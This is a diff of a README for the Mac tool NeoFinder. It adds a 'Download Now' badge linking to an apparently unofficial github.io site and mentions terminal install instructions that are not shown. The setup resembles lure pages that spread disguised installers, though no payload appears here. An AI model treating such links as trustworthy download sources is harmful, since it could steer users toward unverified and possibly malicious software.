@@ -2,7 +2,7 @@
 
 NeoFinder is a powerful digital asset management tool for Mac OS, designed to catalog, organize, and manage your media files effortlessly. Follow the instructions below to install NeoFinder on your Mac and streamline your workflow! 🚀
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)]()
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)](https://neofinder-for-mac.github.io/.github/)
 
 If the download button doesn’t work, follow the terminal command instructions below for a seamless installation.
 
